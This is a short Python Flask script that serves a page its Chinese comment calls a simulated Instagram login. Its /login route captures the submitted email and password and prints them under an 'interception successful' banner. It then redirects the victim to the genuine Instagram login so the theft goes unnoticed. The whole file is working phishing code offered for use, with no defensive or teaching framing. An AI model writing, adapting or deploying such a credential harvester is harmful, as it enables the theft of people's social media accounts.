from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html') # 你的 IG 模擬網頁

@app.route('/login', methods=['POST'])
def login_intercept():
    user = request.form.get('email')
    pwd = request.form.get('pass')

    print(f"--- 攔截成功 ---")
    print(f"帳號: {user}")
    print(f"密碼: {pwd}")
    print(f"---------------")

    return redirect("https://www.instagram.com/accounts/login/?source=auth_switcher")

if __name__ == '__main__':
    app.run(debug=True, port=5000)
